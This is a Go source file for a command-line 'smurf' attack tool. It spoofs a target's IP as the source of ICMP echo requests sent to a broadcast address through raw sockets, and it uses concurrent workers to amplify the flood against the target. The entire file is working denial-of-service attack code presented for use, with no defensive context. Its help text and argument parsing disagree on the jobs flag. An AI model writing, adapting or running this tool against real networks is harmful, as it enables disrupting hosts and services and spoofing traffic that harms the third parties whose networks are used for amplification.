package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"golang.org/x/net/ipv4"
)
func init() {
	// initialize global pseudo random generator
	rand.Seed(time.Now().Unix())
}

const HelpMessage string = "Usage:\n" +
							"\tsmurf -t target" +
							"\t-b broadcast" +
							"\t[-w workers]" +
							"\t[-n jobs]\n\n" +
							"\tOptions:\n\t" +
							"\t-t target: IP address of target machine. Must be in IPv4 format.\n" +
							"\t-b broadcast: broadcast IP address. Must be in IPv4 format.\n" +
							"\t-w workers: amount of workers executing smurf attack. Defaults to 1.\n" +
							"\t-n jobs: number of jobs per worker. Defaults to 1.\n"							
							

func createHeader(header *layers.IPv4, src net.IP, dst net.IP) {
	header.Version = 0x04
	header.IHL = 0x05
	header.TOS = 0x00
	//header.Length = 0x14 //placeholder
	header.Id = uint16(rand.Intn(0xffff))
	header.Flags = layers.IPv4DontFragment
	header.FragOffset = 0x00
	header.TTL = 0x40
	header.Protocol = layers.IPProtocolICMPv4
	header.SrcIP = src
	header.DstIP = dst
}

func createICMP(packet *layers.ICMPv4) {
	packet.TypeCode = layers.CreateICMPv4TypeCode(8,0)
//	packet.Checksum = 0x00 //placeholder
	packet.Id = 0x00
	packet.Seq = 0x0100
}

func createPayload() gopacket.Payload {
	payload := []byte("Hello there")
	return payload
}

func start(src net.IP, dest net.IP) {
	var (
		header layers.IPv4
		packet layers.ICMPv4
		packetConn net.PacketConn
		payload gopacket.Payload
		rawConn *ipv4.RawConn
	)
	createHeader(&header, src, dest)
	createICMP(&packet)
	payload = createPayload()
	ipHeaderBuf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions {
		FixLengths: true,
		ComputeChecksums: true,
	}
	var err error
	if err = header.SerializeTo(ipHeaderBuf, opts); err != nil {
		fmt.Println(err)
		return
	}
	ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
	if err != nil {
		fmt.Println(err)
		return
	}
	payloadBuf := gopacket.NewSerializeBuffer()
	if err = gopacket.SerializeLayers(payloadBuf, opts, &packet, payload); err != nil {
		fmt.Println(err)
		return
	}
	if packetConn, err = net.ListenPacket("ip4:1", "0.0.0.0"); err != nil {
		fmt.Println(err)
		return
	}
	
	if rawConn, err = ipv4.NewRawConn(packetConn); err != nil {
		
		fmt.Println(err)
		return
	}
	if err = rawConn.WriteTo(ipHeader, payloadBuf.Bytes(), nil); err != nil {
		fmt.Println(err)
		return
	}
	return
}

func exit(message string) {
	fmt.Print("Error: " + message + "\n" + HelpMessage)
	os.Exit(0)
}

func smurfWorker(src net.IP, dst net.IP, jobs uint16, wg *sync.WaitGroup) {
	for i := uint16(0); i < jobs; i++ {
		start(src, dst)
	}
	wg.Done()
}

func executeSmurf(src net.IP, dst net.IP, workers uint16, jobs uint16) {
	var wg sync.WaitGroup
	for i := uint16(0); i < workers; i++ {
        wg.Add(1)
        go smurfWorker(src, dst, jobs, &wg)
    }
	wg.Wait()
}

func main() {
	var (
		target string
		broadcast string
		workers uint16 = 1
		jobs uint16 = 1
	)
	if len(os.Args) < 3 {
		exit(" target and broadcast required ")
	}
	for i := 1; i < len(os.Args); i += 1 {
		switch os.Args[i] {
		case "-t":
			if i == len(os.Args)-1 {
				exit("target address should be specified")
			}
			i += 1
			target = os.Args[i]
		case "-b":
			if i == len(os.Args)-1 {
				exit("broadcast address should be specified")
			}
			i += 1
			broadcast = os.Args[i]
		case "-w":
			if i == len(os.Args)-1 {
				exit("workers amount should be specified")
			}
			i += 1
			w, err := strconv.ParseUint(os.Args[i], 10, 16)
			if err != nil {
				exit("workers amount should be specified")
			}
			workers = uint16(w)
		case "-j":
			if i == len(os.Args)-1 {
				exit("jobs amount should be specified")
			}
			i += 1
			j, err := strconv.ParseUint(os.Args[i], 10, 16)
			if err != nil {
				exit("workers amount should be specified")
			}
			jobs = uint16(j)
		default:
			exit("unrecognised option: " + os.Args[i])
		}
	}
	if target == "" {
		exit("target address should be specified")
	}
	
	if broadcast == "" {
		exit("broadcast address should be specified")
	}
	src := net.ParseIP(target)
	if src == nil {
		exit("Wrong target ip address!")
	}
	dst := net.ParseIP(broadcast)
	if dst == nil {
		exit("Wrong broadcast ip address!")
	}
	executeSmurf(src, dst, workers, jobs)
}
